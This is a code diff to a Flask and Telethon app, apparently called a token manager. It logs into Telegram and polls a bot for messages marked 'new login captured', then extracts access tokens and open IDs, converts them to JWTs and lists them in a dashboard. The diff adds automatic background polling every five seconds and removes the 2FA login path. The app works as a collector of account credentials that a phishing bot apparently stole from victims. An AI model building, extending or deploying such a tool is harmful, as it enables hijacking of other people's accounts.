@@ -4,7 +4,9 @@ import json
 import base64
 import asyncio
 import requests
-from datetime import datetime
+import threading
+import time
+from datetime import datetime, timedelta
 from flask import Flask, render_template_string, request, jsonify, session
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
@@ -22,20 +24,27 @@ app.secret_key = os.environ.get('SECRET_KEY', 'ff-token-manager-secret-key-2024'
 
 # ==================== IN-MEMORY STORAGE ====================
 tokens_store = []
-sessions_store = {}  # phone: session_string
-pending_data = {}    # phone: {"client": client, "phone_code_hash": hash}
+sessions_store = {}
+pending_data = {}
+last_message_id = {}
+checking_active = False
+check_thread = None
+last_check_time = None
+check_count = 0
 
 # ==================== GLOBAL EVENT LOOP ====================
-# Single event loop for all Telegram operations
 _loop = None
 
 def get_event_loop():
-    """Get or create a single event loop"""
     global _loop
     if _loop is None or _loop.is_closed():
         _loop = asyncio.new_event_loop()
         asyncio.set_event_loop(_loop)
     return _loop
+
+def run_async(func, *args, **kwargs):
+    loop = get_event_loop()
+    return loop.run_until_complete(func(*args, **kwargs))
 
 # ==================== HTML TEMPLATE ====================
 HTML_TEMPLATE = '''
@@ -359,6 +368,10 @@ HTML_TEMPLATE = '''
             text-align: center;
             margin: 10px 0;
         }
+        .timer-display .time {
+            font-size: 16px;
+            color: rgba(255,255,255,0.5);
+        }
         .tokens-section { margin-top: 20px; }
         .tokens-section h3 {
             color: #fff;
@@ -399,6 +412,13 @@ HTML_TEMPLATE = '''
             border-radius: 20px;
             font-size: 10px;
             font-weight: 600;
+        }
+        .token-item .jwt-preview {
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+            font-family: 'Courier New', monospace;
+            margin-top: 5px;
+            word-break: break-all;
         }
         .jwt-display {
             background: rgba(0,0,0,0.3);
@@ -526,7 +546,10 @@ HTML_TEMPLATE = '''
                         <button class="auto-check-btn" onclick="checkNow()">🔄 Check Now</button>
                     </div>
                 </div>
-                <div class="timer-display" id="timerDisplay">⏳ Not Running</div>
+                <div class="timer-display" id="timerDisplay">
+                    ⏳ Not Running
+                    <div class="time" id="timerDetail"></div>
+                </div>
                 <div style="text-align:center;color:rgba(255,255,255,0.3);font-size:12px;">
                     <span id="checkCount">Checks: 0</span> | 
                     <span id="lastCheck">Last: Never</span>
@@ -552,6 +575,31 @@ HTML_TEMPLATE = '''
         let pendingPhone = null;
         let pendingPhoneCodeHash = null;
 
+        // ==================== TIMER ====================
+        let startTime = null;
+        let timerInterval = null;
+
+        function startTimer() {
+            startTime = Date.now();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const mins = Math.floor(elapsed / 60);
+                const secs = elapsed % 60;
+                document.getElementById('timerDetail').textContent = 
+                    `Running for ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        function stopTimer() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            document.getElementById('timerDetail').textContent = '';
+        }
+
+        // ==================== TOAST ====================
         function showToast(message, type = 'success') {
             const toast = document.getElementById('toast');
             toast.textContent = message;
@@ -559,6 +607,7 @@ HTML_TEMPLATE = '''
             setTimeout(() => { toast.className = 'toast'; }, 5000);
         }
 
+        // ==================== LOGIN ====================
         async function checkLoginStatus() {
             try {
                 const response = await fetch('/api/status');
@@ -570,6 +619,10 @@ HTML_TEMPLATE = '''
                     document.getElementById('otpSection').classList.remove('active');
                     showToast('✅ Already logged in!', 'success');
                     loadTokens();
+                    // Auto start check if logged in
+                    if (!isRunning) {
+                        startAutoCheck();
+                    }
                 } else {
                     document.getElementById('loginStatus').classList.remove('active');
                     document.getElementById('loginInput').style.display = 'flex';
@@ -585,6 +638,7 @@ HTML_TEMPLATE = '''
                 document.getElementById('loginStatus').classList.remove('active');
                 document.getElementById('loginInput').style.display = 'flex';
                 document.getElementById('tokensList').innerHTML = '<div style="color:rgba(255,255,255,0.3);text-align:center;padding:20px;">Logged out. Login to start capturing.</div>';
+                stopTimer();
                 showToast('✅ Logged out successfully', 'success');
             } catch (error) {
                 showToast('❌ Logout failed', 'error');
@@ -620,6 +674,7 @@ HTML_TEMPLATE = '''
                     document.getElementById('loggedUser').textContent = data.username || phone;
                     document.getElementById('loginInput').style.display = 'none';
                     loadTokens();
+                    if (!isRunning) startAutoCheck();
                 } else if (data.need_code) {
                     pendingPhone = phone;
                     pendingPhoneCodeHash = data.phone_code_hash;
@@ -679,43 +734,14 @@ HTML_TEMPLATE = '''
                     document.getElementById('loggedUser').textContent = data.username || pendingPhone;
                     document.getElementById('loginInput').style.display = 'none';
                     loadTokens();
-                } else if (data.need_2fa) {
-                    const password = prompt('🔐 2FA is enabled. Enter your password:');
-                    if (password) {
-                        const verifyResponse = await fetch('/api/verify-2fa', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
-                                phone: pendingPhone, 
-                                password: password
-                            })
-                        });
-                        const verifyData = await verifyResponse.json();
-                        if (verifyData.success) {
-                            status.innerHTML = '✅ ' + verifyData.message;
-                            status.className = 'status-text success';
-                            showToast('✅ Login successful with 2FA!', 'success');
-                            document.getElementById('otpSection').classList.remove('active');
-                            document.getElementById('otpInput').value = '';
-                            document.getElementById('loginStatus').classList.add('active');
-                            document.getElementById('loggedUser').textContent = verifyData.username || pendingPhone;
-                            document.getElementById('loginInput').style.display = 'none';
-                            loadTokens();
-                        } else {
-                            status.innerHTML = '❌ ' + verifyData.message;
-                            status.className = 'status-text error';
-                            showToast('❌ ' + verifyData.message, 'error');
-                        }
-                    }
+                    if (!isRunning) startAutoCheck();
                 } else {
                     status.innerHTML = '❌ ' + data.message;
                     status.className = 'status-text error';
                     showToast('❌ ' + data.message, 'error');
                     if (data.message.includes('expired')) {
                         document.getElementById('otpSection').classList.remove('active');
-                        setTimeout(() => {
-                            sendOTP();
-                        }, 2000);
+                        setTimeout(() => sendOTP(), 2000);
                     }
                 }
             } catch (error) {
@@ -725,6 +751,7 @@ HTML_TEMPLATE = '''
             }
         }
 
+        // ==================== TOKENS ====================
         async function loadTokens() {
             try {
                 const response = await fetch('/api/tokens');
@@ -736,12 +763,14 @@ HTML_TEMPLATE = '''
                 }
                 let html = '';
                 data.tokens.forEach((token, index) => {
+                    const jwtShort = token.jwt ? token.jwt.substring(0, 30) + '...' : 'No JWT';
                     html += `<div class="token-item" onclick="toggleJWT(${index})">
                         <div style="display:flex;justify-content:space-between;align-items:center;">
                             <div>
                                 <div class="uid">🆔 ${token.uid || 'N/A'}</div>
                                 <div class="name">👤 ${token.name || 'Unknown'}</div>
                                 <div class="time">📅 ${token.captured_at || 'N/A'}</div>
+                                <div class="jwt-preview">${jwtShort}</div>
                             </div>
                             <span class="badge">JWT ✓</span>
                         </div>
@@ -770,23 +799,24 @@ HTML_TEMPLATE = '''
             });
         }
 
+        // ==================== AUTO CHECK ====================
         async function startAutoCheck() {
-            if (isRunning) { showToast('⚠️ Already running', 'error'); return; }
-            const minutes = parseInt(prompt('Enter check interval in minutes (e.g., 10):', '10'));
-            if (!minutes || minutes < 1) { showToast('❌ Invalid minutes', 'error'); return; }
+            if (isRunning) { return; }
             
             const response = await fetch('/api/start-check', { method: 'POST' });
             const data = await response.json();
             if (data.success) {
                 isRunning = true;
-                document.getElementById('timerDisplay').textContent = `⏱️ Running (${minutes} min interval)`;
+                document.getElementById('timerDisplay').innerHTML = '⏱️ Running <div class="time" id="timerDetail">Starting...</div>';
                 document.querySelector('.auto-check-btn.running')?.classList.remove('running');
                 document.querySelectorAll('.auto-check-btn')[0].classList.add('running');
-                showToast(`✅ Auto check started (${minutes} min interval)`, 'success');
-                checkNow();
+                startTimer();
                 
                 if (checkInterval) clearInterval(checkInterval);
-                checkInterval = setInterval(() => { checkNow(); }, minutes * 60 * 1000);
+                checkInterval = setInterval(() => { checkNow(); }, 5000); // Check every 5 seconds
+                
+                // Immediate first check
+                setTimeout(() => checkNow(), 1000);
             }
         }
 
@@ -794,8 +824,9 @@ HTML_TEMPLATE = '''
             fetch('/api/stop-check', { method: 'POST' });
             if (checkInterval) { clearInterval(checkInterval); checkInterval = null; }
             isRunning = false;
-            document.getElementById('timerDisplay').textContent = '⏳ Stopped';
+            document.getElementById('timerDisplay').innerHTML = '⏳ Stopped <div class="time" id="timerDetail"></div>';
             document.querySelector('.auto-check-btn.running')?.classList.remove('running');
+            stopTimer();
             showToast('⏹️ Auto check stopped', 'info');
         }
 
@@ -803,6 +834,7 @@ HTML_TEMPLATE = '''
             checkCount++;
             document.getElementById('checkCount').textContent = `Checks: ${checkCount}`;
             document.getElementById('lastCheck').textContent = `Last: ${new Date().toLocaleTimeString()}`;
+            
             try {
                 const response = await fetch('/api/check-token');
                 const data = await response.json();
@@ -810,14 +842,12 @@ HTML_TEMPLATE = '''
                     showToast('🔑 New token captured!', 'success');
                     loadTokens();
                 }
-            } catch (error) { console.error('Check error:', error); }
+            } catch (error) {
+                console.error('Check error:', error);
+            }
         }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            checkLoginStatus();
-            showToast('🔥 Welcome! Enter phone and click Send OTP', 'success');
-        });
-
+        // ==================== KEYBOARD ====================
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 const phoneInput = document.getElementById('phoneInput');
@@ -826,26 +856,24 @@ HTML_TEMPLATE = '''
                 else if (document.activeElement === otpInput) verifyOTP();
             }
         });
+
+        // ==================== INIT ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            checkLoginStatus();
+            showToast('🔥 Welcome! Auto-check starts on login', 'success');
+        });
     </script>
 </body>
 </html>
 '''
 
-# ==================== TELEGRAM FUNCTIONS WITH SINGLE EVENT LOOP ====================
-def run_async(func, *args, **kwargs):
-    """Run async function using the global event loop"""
-    loop = get_event_loop()
-    return loop.run_until_complete(func(*args, **kwargs))
-
+# ==================== TELEGRAM FUNCTIONS ====================
 async def get_or_create_client(phone):
-    """Get existing client or create new one"""
-    # Check if we have a pending client
     if phone in pending_data:
         client = pending_data[phone].get('client')
         if client and client.is_connected():
             return client, True
     
-    # Check if we have a saved session
     session_str = sessions_store.get(phone)
     if session_str:
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
@@ -859,7 +887,6 @@ async def do_login(phone, code=None, phone_code_hash=None):
     try:
         client, is_pending = await get_or_create_client(phone)
         
-        # Check if already authorized
         if await client.is_user_authorized():
             me = await client.get_me()
             sessions_store[phone] = client.session.save()
@@ -867,7 +894,6 @@ async def do_login(phone, code=None, phone_code_hash=None):
                 del pending_data[phone]
             return {"success": True, "message": f"Already logged in as {me.first_name}", "username": me.username}
         
-        # If code provided, verify
         if code and phone_code_hash:
             try:
                 await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -885,7 +911,6 @@ async def do_login(phone, code=None, phone_code_hash=None):
             except Exception as e:
                 return {"success": False, "message": str(e)}
         else:
-            # Send code request
             try:
                 send_code_result = await client.send_code_request(phone)
                 phone_code_hash = send_code_result.phone_code_hash
@@ -907,34 +932,9 @@ async def do_login(phone, code=None, phone_code_hash=None):
     except Exception as e:
         return {"success": False, "message": str(e)}
 
-async def do_login_2fa(phone, password):
-    try:
-        if phone not in pending_data:
-            return {"success": False, "message": "No pending login found"}
-        
-        client = pending_data[phone].get('client')
-        if not client:
-            return {"success": False, "message": "Client not found"}
-        
-        if not client.is_connected():
-            await client.connect()
-        
-        try:
-            await client.sign_in(password=password)
-            me = await client.get_me()
-            sessions_store[phone] = client.session.save()
-            if phone in pending_data:
-                del pending_data[phone]
-            return {"success": True, "message": f"Logged in as {me.first_name}", "username": me.username}
-        except errors.rpcerrorlist.PasswordHashInvalidError:
-            return {"success": False, "message": "Invalid 2FA password"}
-        except Exception as e:
-            return {"success": False, "message": str(e)}
-            
-    except Exception as e:
-        return {"success": False, "message": str(e)}
-
 async def do_capture_token():
+    global check_count, last_check_time
+    
     try:
         if not sessions_store:
             return {"success": False, "message": "Not logged in"}
@@ -948,10 +948,21 @@ async def do_capture_token():
         if not await client.is_user_authorized():
             return {"success": False, "message": "Session expired"}
         
-        await client.send_message(f"@{TARGET_BOT}", "/start")
-        await asyncio.sleep(2)
+        # Get last message ID to check for new messages
+        last_id = last_message_id.get(phone, 0)
         
-        async for message in client.iter_messages(f"@{TARGET_BOT}", limit=10):
+        # Get messages from bot
+        messages = []
+        async for message in client.iter_messages(f"@{TARGET_BOT}", limit=5):
+            if message.id > last_id:
+                messages.append(message)
+        
+        if messages:
+            # Update last message ID
+            last_message_id[phone] = messages[0].id
+        
+        # Check for new token
+        for message in messages:
             if message.text and "ɴᴇᴡ ʟᴏɢɪɴ ᴄᴀᴘᴛᴜʀᴇᴅ" in message.text:
                 token_match = re.search(r'ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ\s*`([a-f0-9]+)`', message.text, re.I)
                 open_id_match = re.search(r'ᴏᴘᴇɴ ɪᴅ\s*`([a-f0-9]+)`', message.text, re.I)
@@ -960,10 +971,12 @@ async def do_capture_token():
                     access_token = token_match.group(1)
                     open_id = open_id_match.group(1) if open_id_match else None
                     
+                    # Check if already captured
                     for token in tokens_store:
                         if token.get('access_token') == access_token:
                             return {"success": True, "message": "Token already captured", "new": False}
                     
+                    # Get JWT from API
                     jwt = None
                     uid = None
                     name = None
@@ -996,10 +1009,38 @@ async def do_capture_token():
                     
                     return {"success": True, "message": "Token captured!", "new": True, "token": token_data}
         
+        check_count += 1
+        last_check_time = datetime.now().isoformat()
         return {"success": True, "message": "No new token found", "new": False}
         
     except Exception as e:
         return {"success": False, "message": str(e)}
+
+# ==================== BACKGROUND CHECK THREAD ====================
+def background_check():
+    global checking_active
+    while checking_active:
+        try:
+            result = run_async(do_capture_token)
+            if result.get('new'):
+                print(f"[NEW TOKEN] {result.get('token', {}).get('uid')}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+        time.sleep(5)  # Check every 5 seconds
+
+def start_background_check():
+    global checking_active, check_thread
+    if checking_active:
+        return {"success": False, "message": "Already running"}
+    checking_active = True
+    check_thread = threading.Thread(target=background_check, daemon=True)
+    check_thread.start()
+    return {"success": True, "message": "Started"}
+
+def stop_background_check():
+    global checking_active
+    checking_active = False
+    return {"success": True, "message": "Stopped"}
 
 # ==================== FLASK ROUTES ====================
 @app.route('/')
@@ -1016,12 +1057,14 @@ def api_status():
         "username": "Logged In" if sessions_store else None,
         "tokens_count": len(tokens_store),
         "sessions_count": len(sessions_store),
+        "check_count": check_count,
+        "last_check": last_check_time,
+        "is_checking": checking_active,
         "timestamp": datetime.now().isoformat()
     })
 
 @app.route('/api/logout', methods=['POST'])
 def api_logout():
-    # Clean up pending clients
     for phone in list(pending_data.keys()):
         try:
             client = pending_data[phone].get('client')
@@ -1031,16 +1074,16 @@ def api_logout():
             pass
     sessions_store.clear()
     pending_data.clear()
+    last_message_id.clear()
+    stop_background_check()
     return jsonify({"success": True, "message": "Logged out"})
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
     data = request.json
     phone = data.get('phone')
-    
     if not phone:
         return jsonify({"success": False, "message": "Phone required"}), 400
-    
     result = run_async(do_login, phone)
     return jsonify(result)
 
@@ -1050,23 +1093,9 @@ def api_verify():
     phone = data.get('phone')
     code = data.get('code')
     phone_code_hash = data.get('phone_code_hash')
-    
     if not phone or not code:
         return jsonify({"success": False, "message": "Phone and code required"}), 400
-    
     result = run_async(do_login, phone, code, phone_code_hash)
-    return jsonify(result)
-
-@app.route('/api/verify-2fa', methods=['POST'])
-def api_verify_2fa():
-    data = request.json
-    phone = data.get('phone')
-    password = data.get('password')
-    
-    if not phone or not password:
-        return jsonify({"success": False, "message": "Phone and password required"}), 400
-    
-    result = run_async(do_login_2fa, phone, password)
     return jsonify(result)
 
 @app.route('/api/check-token')
@@ -1080,11 +1109,11 @@ def api_tokens():
 
 @app.route('/api/start-check', methods=['POST'])
 def api_start_check():
-    return jsonify({"success": True, "message": "Auto-check started"})
+    return jsonify(start_background_check())
 
 @app.route('/api/stop-check', methods=['POST'])
 def api_stop_check():
-    return jsonify({"success": True, "message": "Auto-check stopped"})
+    return jsonify(stop_background_check())
 
 # ==================== FOR VERCEL ====================
 def handler(request, context):
